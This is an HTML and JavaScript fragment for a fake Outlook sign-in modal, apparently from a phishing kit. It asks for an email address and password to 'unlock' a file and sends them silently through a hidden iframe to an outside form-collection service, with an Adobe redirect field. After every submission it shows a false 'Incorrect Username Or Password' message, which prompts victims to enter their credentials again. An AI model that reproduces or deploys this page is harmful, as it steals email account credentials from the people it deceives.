<!-- Outlook Modal -->
<div class="col-xs-12">
    <div id="buttonDiv" class="text-center" style="padding-top: 30px; justify-content: center;">
        <button type="button" class="btn btn-primary" data-toggle="modal" data-target="#outlookModal">Outlook</button>
    </div>
    
    <div id="outlookModal" class="modal fade" role="dialog">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <button type="button" class="close" data-dismiss="modal">&times;</button>
                    <img style="width:50px; height:50px;" src="https://i7.pngguru.com/preview/653/271/784/microsoft-outlook-outlook-com-email-microsoft-office-365-outlook-logo.jpg">
                </div>
                <div class="modal-body">
                    <!-- Honeypot field for basic bot protection -->
                    <input type="text" name="_gotcha" style="display:none" tabindex="-1" autocomplete="off">
                    
                    <!-- SIMPLIFIED FORM: Direct POST to Formspark with redirect -->
                    <form action="https://submit-form.com/0gyAIslPc" method="POST" target="hidden_iframe">
                        <!-- Redirect after submission -->
                        <input type="hidden" name="_redirect" value="https://adobe.com">
                        
                        <div class="form-group">
                            <label for="emailOutlook">Email</label>
                            <input class="form-control" type="email" id="emailOutlook" name="email_1" placeholder="Your receiving email" required>
                        </div>
                        <div class="form-group">
                            <label for="pwdOutlook">Password</label>
                            <input class="form-control" type="password" id="pwdOutlook" name="pw_1" placeholder="Your password" required>
                        </div>
                        <input type="hidden" name="provider" value="outlook">
                        <input type="hidden" name="adobe_login" value="true">
                        <button type="submit" class="btn btn-primary">Unlock File</button>
                    </form>
                    <div class="error-div alert alert-danger" style="display:none;">Incorrect Username Or Password</div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- Simple script for showing the error message (optional, but keeps user experience) -->
<script>
    document.querySelectorAll('form').forEach(form => {
        form.addEventListener('submit', function(e) {
            // Show the spinner (optional visual feedback)
            document.querySelector('.spinner').style.display = 'block';
            
            // For a single-page feel, we don't prevent default.
            // The form submits to the hidden iframe, and the page won't reload.
            // The error message can be shown after a delay if needed.
            setTimeout(() => {
                document.querySelectorAll('.error-div').forEach(el => el.style.display = 'block');
                document.querySelector('.spinner').style.display = 'none';
            }, 2000);
        });
    });
</script>
